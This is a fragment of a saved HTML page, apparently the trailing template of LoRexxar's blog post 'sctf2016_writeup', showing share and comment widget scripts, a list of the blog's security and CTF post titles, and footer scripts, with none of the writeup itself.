+                "common":{"bdSnsKey":{},"bdText":"sctf2016_writeup　| LoRexxar's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+
+<section class="youyan" id="comments">
+<script>
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = 'http://v2.uyan.cc/code/uyan.js?uid=2127998';
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+<script> loadComment(); </script>
+<div id="uyan_frame"></div>
+</section>
+<div class="scroll" id="post-nav-button">
+<a href="/2016/05/10/asis-bcloud/" title="上一篇: Asis2016_Binary Cloud">
+<i class="fa fa-angle-left"></i>
+</a>
+<a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+<a href="/2016/05/05/dockerfile/" title="下一篇: dockerfile  (・ω・)ノ">
+<i class="fa fa-angle-right"></i>
+</a>
+</div>
+<ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/16/nonce-bypass-script/">通过浏览器缓存来bypass CSP script nonce</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/pppctf2017/">PlaidCTF 2017 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/xss-bot2/">xss bot从入门到弃坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/09/CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy/">CSP Is Dead, Long Live CSP! 翻译</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/24/pwnhub-jue/">pwnhub 绝对防御 出题思路和反思</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/Shadow-Brokers/">Shadow Brokers大新闻整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/360chunqiu2017/">360春秋杯2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/18/bctf2017-web/">bctf2017 web部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/27/pwnhub-xiaom/">pwnhub 之小m的复仇</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/21/0ctf2017-web/">0ctf201 web部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/njctf2017-wp/">NJCTF Web部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/05/pwnhub-another-php/">pwnhub_another php web部分</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/zctf2017-writeup/">zctf2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/20/pwnhub-open/">pwnhub 打开电脑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/16/cdn-bypass-csp/">有趣的cdn bypass CSP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/26/hctf2016-something/">聊聊hctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/pwnhub-shen/">pwnhub 深入敌后</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/03/33c3-wp/">33c32016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/cve-2016-10030/">phpmailer RCE漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/26/pwnhub_mi/">pwnhub_迷</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/24/xss-protect/">浅谈xss的后台守护问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/18/pwnhub-pai2/">pwnhub_拍卖行</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/18/pwnhub-pai/">pwnhub_找朋友</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/10/pwnhub-WTF-writeup/">pwnhub_WTF_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/07/polyglot-JPEGs-bypass-csp/">using polyglot JPEGs bypass CSP 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/03/redis-getshell/">通过redis getshell的一些小问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/01/hctf2016-other/">hctf2016 简单部分WEB &amp;&amp; misc writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/30/hctf2016-xss/">hctf2016 guestbook&amp;secret; area writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/29/hctf2016-ATField/">HCTF2016 ATField writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/19/web2-giligili/">hctf2016 giligili writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/31/csp-then2/">CSP进阶-302 Bypass CSP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/28/csp-then/">CSP进阶-link Bypass unsafe line</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/26/ctf-start/">什么是ctf呢？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/11/hitcon2016-misc/">hitcon2016 misc writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/10/hitcon2016/">hitcon2016 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/03/Lctf2016/">L-ctf2016 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/14/php-wei/">php 伪协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/11/huashanbei2016/">华山杯2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/29/crypto-start/">crypto 简单的RSA</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/18/sqlmap-source4/">sqlmap 源码分析（四）开始注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/sqlmap-source3/">sqlmap 源码分析（三）在注入之前</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/11/sqlmap-source2/">sqlmap 源码分析（二）初始化</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/09/sqlmap-source1/">sqlmap 源码分析（一）开始、参数解析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/08/ccsp/">CSP Level 3浅析&amp;简单的bypass</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/07/python-virtualenv/">python virtualenv沙盒命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/01/xnuca-ctf-wp/">XNUCA2016 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/21/python-tqdm/">python tqdm模块分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/18/cmd-shell/">shell上一些有趣的命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/17/sangebaimao_huobi/">sangebaimao之火币网</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/12/guosai-ctf-wp/">信息安全国赛技能赛 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/26/cloudeye/">一个有趣的东西-cloudeye</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/sangebaimao-zhao/">sangebaimao之招聘又开始了，你怕了吗？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/06/alictf2016/">alictf2016_web_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/04/sangebaimao1/">sangebaimao 寻找来自星星的你一</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/27/opcache-jcfx/">在php opcache检测隐藏的后门程序</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/12/php-shell/">php webshell 各种函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/asis-bcloud/">Asis2016_Binary Cloud</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/09/sctf2016/">sctf2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/05/dockerfile/">dockerfile  (・ω・)ノ</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/04/docker-jc/">docker 基础操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/02/ggctf2016/">google_ctf2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/25/cctf2016/">CCTF2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/20/gif-ccsp/">gif bypass CSP?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/j123jt-wp/">j123jt的聊天板大型wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/sctf-Obfusion/">sctfq1_Obfusion_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/input-bypasscsrf/">input属性bypass csp</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/06/hctfgame-llfx/">hctfgame_ll的流量分析题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/phpblack/">is_numeric和trim导致的判断绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/30/web-for-pentest-II/">web_for_pentest_II writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/22/bctf2016/">bctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/hctfgame_week4+5_writeup/">hctf_game_week4+5_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0ctf2016/">0ctf2016 &amp;&amp; sunshinectf2016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/bkp2016-writeup/">bkp2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/05/hexo-coding/">hexo转移到coding配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/01/ssctf2015-writeup/">ssctf2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/29/hctfgame_week3_writeup/">hctf_game_week3_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/28/ldpai/">ldpa简单注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/28/titan-souls-ez/">titan souls 普通模式通关攻略</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/easy_git/">简单的git教程</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week2_writeup/">hctf_game_week2_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week1_writeup/">hctf_game_week1_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week0_writeup/">hctf_game_week0_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/21/dmsj-book/">《代码审计》一点儿笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/hctf2015/">hctf2015的一点儿记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/xss-link/">xss link&amp;svg;黑魔法</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/sql-error/">SQL 显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/17/rctf2015/">RCTF2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/17/isg2015/">ISG2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/02/hsb/">SPWC &amp; 华山杯？ writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/24/sqli_h/">关于sqli注入的特殊函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/04/XDCTF2015-writeup/">XDCTF2015-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/09/28/nsctf-writeup/">Nsctf2015_Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/02/xss-p/">xss无声挑战赛_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/06/11/ctf0611/">ctf近期总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/22/Hexo-blogs/">Windows Hexo博客安装配置优化（小白篇）</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/21/fucksql/">Hduisa_ctf_wee4_fucksql</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/10/webforpentester/">Web for pentester_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/hduisa-ctf-writeup2/">Hduisa_ctf_writeup02</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/hduisa-ctf-writeup1/">Hduisa_ctf_writeup01</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/shinian/">（转）十年学会程序设计</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/01/22/webfirst/">0基础如何学好WEB（转）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/31/hackx/">凤凰挽歌，黑客独白（作者：我是老鹰&amp;炫凤舞）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/29/bookshelf1/">（转）学长们给我们的书目（结尾附上PDF地址）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/29/xiaobaistart/">菜鸟小白的开始...</a></li></ul>
+<script>
+</script>
+
+<footer id="footer">
+<div class="outer">
+<div id="footer-info">
+<div class="footer-left">
+<i class="fa fa-copyright"></i> 
+                2014-2017 LoRexxar
+            </div>
+<div class="footer-right">
+<a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+</div>
+</div>
+<div class="visit">
+<span id="busuanzi_container_site_pv" style="display:none">
+<span id="site-visit" title="本站到访数"><i aria-hidden="true" class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span>
+</span>
+</span>
+<span>| </span>
+<span id="busuanzi_container_page_pv" style="display:none">
+<span id="page-visit" title="本页阅读量"><i aria-hidden="true" class="fa fa-eye animated infinite pulse"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+</div>
+</div>
+</footer>
+
+<script data-main="/js/main.js" src="./sctf2016_writeup  LoRexxar's Blog/require.min.js"></script>
+<script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 7;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+<div class="scroll" id="scroll">
+<a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+<a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+<a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+<script async="" src="./sctf2016_writeup  LoRexxar's Blog/busuanzi.pure.mini.js">
+</script>
+
+
